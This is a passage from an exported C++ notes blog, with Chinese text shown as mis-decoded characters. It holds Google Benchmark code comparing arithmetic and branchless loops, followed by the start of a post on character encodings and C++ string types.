state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125;void BM_add_multiply2(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); std::vector&lt;unsigned long&gt; v3(N), v4(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); v3[i] = rand(); v4[i] = rand(); &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); unsigned long* p3 = v3.data(); unsigned long* p4 = v4.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; a1 += p1[i] + p2[i]; a2 += p3[i] * p4[i]; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125;void BM_add2_multiply_sub_shift(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; unsigned long a3 = 0, a4 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; a1 += p1[i] + p2[i]; a2 += p1[i] * p2[i]; a3 += p1[i] &lt;&lt; 2; a4 += p2[i] - p1[i]; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::DoNotOptimize(a3); benchmark::DoNotOptimize(a4); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125;void BM_instructions1(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; unsigned long a3 = 0, a4 = 0; unsigned long a5 = 0, a6 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; a1 += p1[i] + p2[i]; a2 += p1[i] * p2[i]; a3 += p1[i] &lt;&lt; 2; a4 += p2[i] - p1[i]; a5 += p2[i] &lt;&lt; 1; a6 += (p2[i] - 3); &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::DoNotOptimize(a3); benchmark::DoNotOptimize(a4); benchmark::DoNotOptimize(a5); benchmark::DoNotOptimize(a6); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125;void BM_instructions2(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; unsigned long a3 = 0, a4 = 0; unsigned long a5 = 0, a6 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; a1 += p1[i] + p2[i]; a2 += p1[i] * p2[i]; a3 += p1[i] &lt;&lt; 2; a4 += p2[i] - p1[i]; a5 += (p2[i] &lt;&lt; 1)*p2[i]; a6 += (p2[i] - 3)*p1[i]; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::DoNotOptimize(a3); benchmark::DoNotOptimize(a4); benchmark::DoNotOptimize(a5); benchmark::DoNotOptimize(a6); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125;void BM_add2_multiply_sub_shift4(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); std::vector&lt;unsigned long&gt; v3(N), v4(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); v3[i] = rand(); v4[i] = rand(); &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); unsigned long* p3 = v3.data(); unsigned long* p4 = v4.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; unsigned long a3 = 0, a4 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; a1 += p1[i] + p2[i]; a2 += p2[i] * p3[i]; a3 += p4[i] &lt;&lt; 2; a4 += p3[i] - p4[i]; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::DoNotOptimize(a3); benchmark::DoNotOptimize(a4); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125;void BM_max(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; a2 += (p1[i] &gt; p2[i]) ? p1[i] : p2[i]; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125;void BM_add_multiply_dep(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; a1 += (p1[i] + p2[i]) * (p1[i] - p2[i]); //a1 += (p1[i] * p2[i]); &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125;#define ARGS \\ -&gt;Arg(1&lt;&lt;22)BENCHMARK(BM_add) ARGS;BENCHMARK(BM_multiply) ARGS;BENCHMARK(BM_divide) ARGS;BENCHMARK(BM_add_multiply) ARGS;BENCHMARK(BM_add_multiply2) ARGS;BENCHMARK(BM_add2_multiply_sub_shift) ARGS;BENCHMARK(BM_instructions1) ARGS;BENCHMARK(BM_instructions2) ARGS;BENCHMARK(BM_add2_multiply_sub_shift4) ARGS;BENCHMARK(BM_max) ARGS;BENCHMARK(BM_add_multiply_dep) ARGS;BENCHMARK_MAIN(); æ— åˆ†æ”¯è®¡ç®— æ— åˆ†æ”¯è®¡ç®—å¯ä»¥æ¶ˆé™¤æˆ–è€…å‡è½»åˆ†æ”¯é¢„æµ‹å¤±è´¥å¸¦æ¥çš„æ€§èƒ½æŸå¤±ã€‚ ä½†æ˜¯ï¼Œå¦‚æœæ¶ˆé™¤åˆ†æ”¯çš„ä»£ä»·æ˜¯ï¼Œå¢åŠ äº†éå†…è”çš„å¤æ‚å‡½æ•°çš„è°ƒç”¨æ¬¡æ•°ï¼Œé‚£ä¹ˆå‡½æ•°è°ƒç”¨çš„ä»£ä»·ä¼šæ¯”åˆ†æ”¯é¢„æµ‹å¤±è´¥çš„ä»£ä»·å¤§ã€‚ å› ä¸ºå‡½æ•°è°ƒç”¨æœ¬èº«å°±ä¼šä¸­æ–­æµæ°´çº¿ï¼Œè¿™ä¹Ÿæ˜¯å†…è”å‡½æ•°é«˜æ•ˆåœ°ä¸€ä¸ªåŸå› ä¹‹ä¸€ã€‚ 123// ç¼–è¯‘å‘½ä»¤clang++ -g -O3 -mavx2 -Wall -pedantic -I$GBEN_INC -lpthread -lrt -lm 02_branch.C $GBEN_LIB/libbenchmark.a -o benchmark 1234567#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;iostream&gt;#define MCA_START __asm volatile(\"# LLVM-MCA-BEGIN\");#define MCA_END __asm volatile(\"# LLVM-MCA-END\");#include \"benchmark/benchmark.h\" ä¾‹ä¸€ 1234567891011121314151617181920212223242526272829303132void BM_branched(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); std::vector&lt;int&gt; c1(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); c1[i] = rand() &amp; 0x1; &#125; unsigned long* p1 = v1.data(); int* b1 = c1.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; for (size_t i = 0; i &lt; N; ++i) &#123;#if 0 (b1[i] ? a1 : a2) += p1[i];#else if (b1[i]) &#123; a1 += p1[i]; &#125; else &#123; a2 += p1[i]; &#125;#endif // 1 &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125; ä½¿ç”¨æ•°ç»„ï¼Œæ¶ˆé™¤åˆ†æ”¯ï¼Œé€šè¿‡ç´¢å¼•åœ¨ä¸åŒçš„å†…å­˜å•å…ƒè¿›è¡Œè®¡ç®—ã€‚ 12345678910111213141516171819202122232425void BM_branchless(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); std::vector&lt;int&gt; c1(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); c1[i] = rand() &amp; 0x1; &#125; unsigned long* p1 = v1.data(); int* b1 = c1.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; unsigned long* a[2] = &#123; &amp;a2, &amp;a1 &#125;; for (size_t i = 0; i &lt; N; ++i) &#123; a[b1[i]] += p1[i]; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125; (b1[i] ? a1 : a2) åœ¨æŸäº›ç¼–è¯‘å™¨ä¸­ï¼Œä¼šä½¿ç”¨æŸ¥æ‰¾æ•°ç»„çš„æ–¹å¼ä¼˜åŒ–ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢çš„æ–¹å¼ã€‚æ‰€ä»¥ï¼Œæ¯”ä½¿ç”¨æ¡ä»¶åˆ†æ”¯ä»£ç æ›´é«˜æ•ˆã€‚ ä¾‹äºŒ 1234567891011121314151617181920212223242526272829void BM_branched1(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); std::vector&lt;int&gt; c1(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); c1[i] = rand() &amp; 0x1; &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); int* b1 = c1.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; if (b1[i]) &#123; a1 += p1[i]; &#125; else &#123; a2 += p2[i]; &#125; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125; ä½¿ç”¨ä¸¤ä¸ªä¸­é—´å€¼æ•°ç»„ï¼Œè¿›è¡Œåˆ†æ”¯æ¶ˆé™¤ã€‚ 12345678910111213141516171819202122232425262728void BM_branchless1(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); std::vector&lt;int&gt; c1(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); c1[i] = rand() &amp; 0x1; &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); int* b1 = c1.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; unsigned long s1[2] = &#123; 0, p1[i] &#125;; unsigned long s2[2] = &#123; p2[i], 0 &#125;; a1 += s1[b1[i]]; a2 += s2[b1[i]]; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125; ä¾‹ä¸‰ åŸºäºéšæœºå€¼æ¡ä»¶åˆ†æ”¯çš„ç‰ˆæœ¬ï¼Œå¤„ç†å™¨ä¸èƒ½å¯¹å…¶è¿›è¡Œé«˜æ•ˆæ­£ç¡®ç‡é«˜çš„åˆ†æ”¯é¢„æµ‹ã€‚ 1234567891011121314151617181920212223242526272829void BM_branched2(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); std::vector&lt;int&gt; c1(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); c1[i] = rand() &amp; 0x1; &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); int* b1 = c1.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; if (b1[i]) &#123; a1 += p1[i] - p2[i]; &#125; else &#123; a2 += p1[i] * p2[i]; &#125; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125; åŸºäºboolå€¼æ¡ä»¶åˆ†æ”¯çš„ç‰ˆæœ¬ï¼Œå¤„ç†å™¨å¯ä»¥è¿›è¡Œé«˜æ•ˆæ­£ç¡®ç‡é«˜çš„åˆ†æ”¯é¢„æµ‹ï¼Œç¨‹åºä¼šè¢«å¤„ç†å™¨ä¼˜åŒ–æ‰§è¡Œï¼Œå®æµ‹æ€§èƒ½ä¸æ— åˆ†æ”¯ç‰ˆæœ¬ç›¸å½“ï¼Œç”šè‡³æ›´å¥½ã€‚ 1234567891011121314151617181920212223242526272829void BM_branched2_predicted(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); std::vector&lt;int&gt; c1(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); c1[i] = rand() &gt; 0; &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); int* b1 = c1.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; if (b1[i]) &#123; a1 += p1[i] - p2[i]; &#125; else &#123; a2 += p1[i] * p2[i]; &#125; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125; æ— åˆ†æ”¯ç‰ˆæœ¬ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556void BM_branchless2(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); std::vector&lt;int&gt; c1(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); c1[i] = rand() &amp; 0x1; &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); int* b1 = c1.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; for (size_t i = 0; i &lt; N; ++i) &#123; unsigned long s1[2] = &#123; 0, p1[i] - p2[i] &#125;; unsigned long s2[2] = &#123; p1[i] * p2[i], 0 &#125;; a1 += s1[b1[i]]; a2 += s2[b1[i]]; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125;void BM_branchless2a(benchmark::State&amp; state) &#123; srand(1); const unsigned int N = state.range(0); std::vector&lt;unsigned long&gt; v1(N), v2(N); std::vector&lt;int&gt; c1(N); for (size_t i = 0; i &lt; N; ++i) &#123; v1[i] = rand(); v2[i] = rand(); c1[i] = rand() &amp; 0x1; &#125; unsigned long* p1 = v1.data(); unsigned long* p2 = v2.data(); int* b1 = c1.data(); for (auto _ : state) &#123; unsigned long a1 = 0, a2 = 0; unsigned long* a[2] = &#123; &amp;a2, &amp;a1 &#125;; for (size_t i = 0; i &lt; N; ++i) &#123; unsigned long s[2] = &#123; p1[i] * p2[i], p1[i] - p2[i] &#125;; a[b1[i]] += s[b1[i]]; &#125; benchmark::DoNotOptimize(a1); benchmark::DoNotOptimize(a2); benchmark::ClobberMemory(); &#125; state.SetItemsProcessed(N*state.iterations()); //state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());&#125;","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"Optimize","slug":"Optimize","permalink":"https://racleray.github.io/tags/Optimize/"}],"author":"HeRui"},{"title":"C++ String","slug":"C-String","date":"2022-11-12T15:20:11.000Z","updated":"2024-01-09T10:19:17.591Z","comments":true,"path":"posts/d5d2990b.html","link":"","permalink":"https://racleray.github.io/posts/d5d2990b.html","excerpt":"C++ string ç¬”è®°","text":"è®¡ç®—æœºä¸­çš„å­—ç¬¦ ACSIIç  èµ·åˆï¼Œè®¡ç®—æœºä½¿ç”¨ACSIIç è¡¨ç¤ºä¸åŒçš„è‹±æ–‡å­—æ¯ä»¥åŠç¬¦å·ã€‚ä¾‹å¦‚ 32 ä»£è¡¨ç©ºæ ¼ï¼Œ48 ä»£è¡¨ â€˜0â€™ï¼Œ65 ä»£è¡¨ â€˜Aâ€™ï¼Œ97 ä»£è¡¨ â€˜aâ€™ã€‚ 32~126 è¿™äº›æ•´æ•°å°±ç”¨äºæ˜¯è¡¨ç¤ºè¿™äº›å¯æ˜¾ç¤ºå­—ç¬¦(printable character)çš„ã€‚ 0~31 å’Œ 127 è¿™äº›æ•´æ•°ï¼Œè§„å®šäº†ä¸€ç±»ç‰¹æ®Šçš„æ§åˆ¶å­—ç¬¦(control character)ï¼š 0 è¡¨ç¤ºç©ºå­—ç¬¦ï¼ˆâ€˜\\0â€™ï¼‰ 9 è¡¨ç¤º Tab åˆ¶è¡¨ç¬¦ï¼ˆâ€˜ï¼‰ 10 è¡¨ç¤ºæ¢è¡Œï¼ˆâ€˜â€™ï¼‰ 13 è¡¨ç¤ºå›è½¦ï¼ˆâ€˜ï¼‰ 27 è¡¨ç¤º ESC é”®ï¼ˆâ€˜1bâ€™ï¼‰ 127 è¡¨ç¤º DEL é”®ï¼ˆâ€˜7fâ€™ï¼‰ç­‰ ä¸€äº›æ§åˆ¶ç¬¦å·çš„ä½¿ç”¨ï¼Œæ¯”è¾ƒå¸¸è§ï¼Œå¦‚ï¼šCtrl+C æ¥å‘é€ä¸­æ–­ä¿¡å·ï¼ˆSIGINTï¼‰å¼ºåˆ¶ç»ˆæ­¢ç¨‹åºï¼›Ctrl+D æ¥å…³é—­æ ‡å‡†è¾“å…¥æµï¼Œç»ˆæ­¢æ­£åœ¨è¯»å–ä»–çš„ç¨‹åºï¼›Ctrl+I çš„æ•ˆæœå’Œ Tab é”®ä¸€æ ·ï¼Œ Ctrl+J çš„æ•ˆæœå’Œ Enter é”®ä¸€æ ·ï¼ŒCtrl+H çš„æ•ˆæœå’Œé€€æ ¼é”®ä¸€æ ·... å…·ä½“å¯ä»¥ä¸Šwikiä¸ŠæŸ¥çœ‹ã€‚ UTF ASCII ç è¡¨ï¼Œå»ºç«‹äº†è‹±æ–‡å­—æ¯å’Œæ ‡ç‚¹ç¬¦å·åˆ° 0x00~0x7F çš„ä¸€ä¸€æ˜ å°„ã€‚é‚£ä¹ˆï¼Œä¸­æ–‡ã€æ‹‰ä¸æ–‡å­—ã€ä¿„æ–‡ç­‰ç­‰å‘¢ï¼Ÿ æ‰€ä»¥ï¼Œå„å›½å¼€å§‹æ¨å‡ºè‡ªå·±ç”¨çš„ç¼–ç æ ¼å¼è§„èŒƒã€‚ä¸­å›½å¤§é™†æ¨å‡ºäº† GBK ç¼–ç æ ¼å¼è¡¨ç¤ºç®€ä½“ä¸­æ–‡çš„å­—ç¬¦ï¼ŒåŒæ—¶ç®€ä½“å’Œç¹ä½“çš„ GB18030 ç¼–ç ï¼ŒåŒ…å«äº† 27484 ä¸ªæ±‰å­—ï¼›æ—¥æœ¬æ¨å‡ºäº† Shift-JIS ç¼–ç æ ¼å¼è¡¨ç¤ºæ—¥è¯­çš„å­—ç¬¦ï¼Œç­‰ç­‰ã€‚ å†åæ¥ï¼Œå°±æœ‰äº†â€œä¸‡å›½ç â€çš„ Unicodeã€‚ä»–ç»™ä¸–ç•Œä¸Šæ‰€æœ‰çš„å­—ç¬¦ç¼–ç ã€‚å…¨éƒ¨å­—ç¬¦éƒ½å¯ä»¥ç”¨ä¸€ä¸ª 0x000000~0x10FFFF çš„æ•´æ•°è¡¨ç¤ºï¼Œä¹Ÿå°±æ˜¯3ä¸ªå­—èŠ‚ã€‚ UTF-32 UTF-32 ä½¿ç”¨ wchar_t è¿™ä¸ª 4 å­—èŠ‚çš„æ•°æ®ç±»å‹ï¼Œæ¥è¡¨ç¤º Unicode ç¼–ç ï¼Œå®Œå…¨å¤Ÿç”¨ã€‚ wchar_t çš„é—®é¢˜åœ¨äºï¼Œæœ€é«˜ä½å­—èŠ‚æ˜¯ 0ï¼Œå¯¼è‡´ C è¯­è¨€ä½¿ç”¨ \\0 åˆ¤æ–­å­—ç¬¦ä¸²ç»“æŸç¬¦çš„æ–¹å¼ä¸å†é€‚ç”¨ã€‚ C è¯­è¨€ä¸ºäº†é€‚åº”è¿™ä¸ªå˜åŒ–ï¼Œæ¨å‡ºäº†ä¸“é—¨é’ˆå¯¹ wchar_t çš„ wcslenã€wcscpyã€wmemset ç­‰å‡½æ•°ã€‚Windows ä¹Ÿæ¨å‡º LoadLibraryA å’Œ LoadLibraryW ä¸¤ä¸ªç‰ˆæœ¬ï¼Œåˆ†åˆ«é€‚é… char å’Œ wchar_tã€‚ æ˜¾ç„¶ï¼Œæ‰€æœ‰å­—ç¬¦éƒ½å ç”¨4å­—èŠ‚ï¼Œæ˜¯æµªè´¹çš„ã€‚å³ä½¿æ˜¯ä¸­æ–‡æ±‰å­—ï¼Œæœ¬æ¥ä¹Ÿåªéœ€è¦ 2 å­—èŠ‚å°±èƒ½è¡¨ç¤ºäº†ï¼ˆ27484 ä¸ªæ±‰å­—ï¼Œåœ¨ 65536 çš„èŒƒå›´å†…ï¼‰ã€‚ UTF-16 Windows é‡‡ç”¨äº† UTF-16 ç¼–ç æ ¼å¼ï¼Œè¿™ç§è§„èŒƒä¸‹çš„ wchar_t æ˜¯ 2 å­—èŠ‚çš„ï¼ˆå®é™…ä¸Šå°±æ˜¯ unsigned short çš„ç±»å‹åˆ«åï¼‰ã€‚è¶…è¿‡2å­—èŠ‚çš„å­—ç¬¦è¢«åˆ†æˆä¸¤ä¸ª wchar_tè¡¨ç¤ºï¼Œæ‹†æ³•å¾ˆå¤æ‚ã€‚ Windows ä¸ºäº†æ›´å¥½åœ°ä¼ºå€™ä¸­å›½å®¢æˆ·ï¼Œè¿˜ä¸“é—¨æŠŠä¸­æ–‡ Windows ç³»ç»Ÿçš„é»˜è®¤ç¼–ç æ ¼å¼æ”¹æˆäº† GBKï¼Œå¤§å¤§å¦¨ç¢äº†ç¨‹åºå‘˜ç¼–ç¨‹å’Œå›½é™…äº¤æµçš„ä¾¿åˆ©æ€§ã€‚ UTF-8 UTF-16 æ²¡æ³•å…¼å®¹ ASCIIï¼Œåœ¨ç½‘ç»œä¸Šä¼ è¾“è¿˜éœ€è¦è€ƒè™‘å­—èŠ‚åºç­‰ç­‰å„ç§é—®é¢˜ã€‚ UTF-8 åˆ™æ˜¯åœ¨ 1ã€2ã€3ã€4 å­—èŠ‚ä¹‹é—´å˜é•¿çš„ç¼–ç ã€‚ ä½œä¸ºå˜é•¿ç¼–ç çš„ä»£ä»·ï¼ŒUTF-8 éœ€è¦åœ¨äºŒè¿›åˆ¶ä¸­æµªè´¹é¢å¤–çš„ç©ºé—´æ¥è¡¨ç¤ºå½“å‰ç¼–ç çš„é•¿åº¦ã€‚ä½†æ˜¯ 1 ä¸ªå­—èŠ‚çš„ASCIIç è¿˜æ˜¯èƒ½ä½¿ç”¨ä¸€ä¸ªå­—èŠ‚è¡¨ç¤ºã€‚ä½¿ç”¨äºŒè¿›åˆ¶ä½çš„æ ‡è®°æ–¹å¼ï¼Œè¿›è¡Œå˜é•¿ç¼–ç ã€‚ è€Œæ­¤æ—¶ï¼ŒC è¯­è¨€ä¹Ÿå¯ä»¥ä½¿ç”¨ \\0 åˆ¤æ–­å­—ç¬¦ä¸²ç»“æŸç¬¦äº†ã€‚èŠ‚çœäº†ä¸€äº›ç©ºé—´ï¼Œä¹Ÿè§£å†³äº†Cè¯­è¨€é€‚é…çš„é—®é¢˜ã€‚ è§£ç ç¼–ç æ ¼å¼å¯¹åº” è¯»å†™åŒæ–¹ç¼–ç æ ¼å¼ä¸åŒï¼Œä¼šå¯¼è‡´ä¹±ç ã€‚ æ‰€ä»¥ MSVC ç¼–è¯‘å™¨è°ƒè¯•æ—¶ï¼Œâ€œçƒ«çƒ«çƒ«â€çš„é—®é¢˜ï¼Œä¹Ÿå¯ä»¥è§£é‡Šäº†ã€‚ Windows çš„ MSVC åœ¨ Debug æ¨¡å¼ä¸‹ä¼šé»˜è®¤æŠŠæœªåˆå§‹åŒ–çš„æ ˆå†…å­˜å¡«æ»¡ 0xCCï¼ˆx86 çš„ INT3 å•æ­¥ä¸­æ–­æŒ‡ä»¤ï¼‰ï¼Œæœªåˆå§‹åŒ–çš„å †å†…å­˜å¡«æ»¡ 0xCDã€‚ è€Œ 0xCCCC åœ¨ GBK ç¼–ç ä¸­å°±æ˜¯â€œçƒ«â€ï¼Œæ‰€ä»¥å¦‚æœæ‰“å°äº†æ ˆä¸Šæœªåˆå§‹åŒ–çš„å­—ç¬¦ä¸²æ•°ç»„ï¼Œå°±ä¼šçœ‹åˆ°â€œçƒ«çƒ«çƒ«â€ã€‚è€Œ 0xCDCD åœ¨ GBK ç¼–ç ä¸­å°±æ˜¯â€œå±¯â€ï¼Œæ‰€ä»¥å¦‚æœæ‰“å°äº†å †ä¸Šæœªåˆå§‹åŒ–çš„å­—ç¬¦ä¸²æ•°ç»„ï¼Œå°±ä¼šçœ‹åˆ°â€œå±¯å±¯å±¯â€ã€‚ è™½ç„¶ç°åœ¨æ™®éé‡‡ç”¨äº† UTF-8 æ ¼å¼ï¼Œä½†æ˜¯ä¸­æ–‡ç‰ˆ Windows è¿˜åœ¨ç”¨ UTF-16 å’Œ GBKã€‚Linux ä¹Ÿå¯æ ¹æ®ç¯å¢ƒå˜é‡ LANG å’Œ LC_ALL çš„å€¼æ¥åŠ¨æ€å†³å®šé‡‡ç”¨å“ªç§ç¼–ç æ ¼å¼å’Œè¯­è¨€ã€‚ C++ ä¸­å¯¹å„å¤§ç¼–ç æ ¼å¼çš„æ”¯æŒå¦‚ä¸‹è¡¨ï¼š å­—ç¬¦ç±»å‹ å­—ç¬¦ä¸²ç±»å‹ å­—ç¬¦ä¸²å¸¸é‡è¯­æ³• å¤§å°ï¼ˆå­—èŠ‚ï¼‰ ç¼–ç æ ¼å¼ char string \"å­—ç¬¦\" 1 éšç³»ç»Ÿé»˜è®¤ç¼–ç æ ¼å¼è€Œå˜ wchar_tï¼ˆLinuxï¼‰ wstring L\"å­—ç¬¦\" 4 UTF-32 wchar_tï¼ˆWindowsï¼‰ wstring L\"å­—ç¬¦\" 2 UTF-16 char8_tï¼ˆC++20ï¼‰ u8string u8\"å­—ç¬¦\" 1 UTF-8 char16_tï¼ˆC++11ï¼‰ u16string u\"å­—ç¬¦\" 2 UTF-16 char32_tï¼ˆC++11ï¼‰ u32string U\"å­—ç¬¦\" 4 UTF-32 åé¢ä¸‰ä¸ªæ˜¯ä¸éšç³»ç»Ÿè€Œæ”¹å˜çš„ï¼ˆC++ æ ‡å‡†å§”å‘˜ä¼šå®šä¹‰ï¼‰ã€‚ C è¯­è¨€å­—ç¬¦ä¸² char åœ¨Cè¯­è¨€ä¸­ï¼Œcharç±»å‹å°±æ˜¯æ•´æ•°ï¼Œåªä¸è¿‡è¢«è¡¨ç¤ºæˆå¯¹åº”çš„å­—ç¬¦è¡¨ç¤ºã€‚æ˜¯æ•°å­—å°±å¯ä»¥æ¯”è¾ƒå¤§å°ç­‰ã€‚ å¸¸ç”¨çš„å¸®æ‰‹å‡½æ•°å¦‚ä¸‹ï¼š isupper(c) åˆ¤æ–­æ˜¯å¦ä¸ºå¤§å†™å­—æ¯ï¼ˆâ€˜Aâ€™ &lt;= c 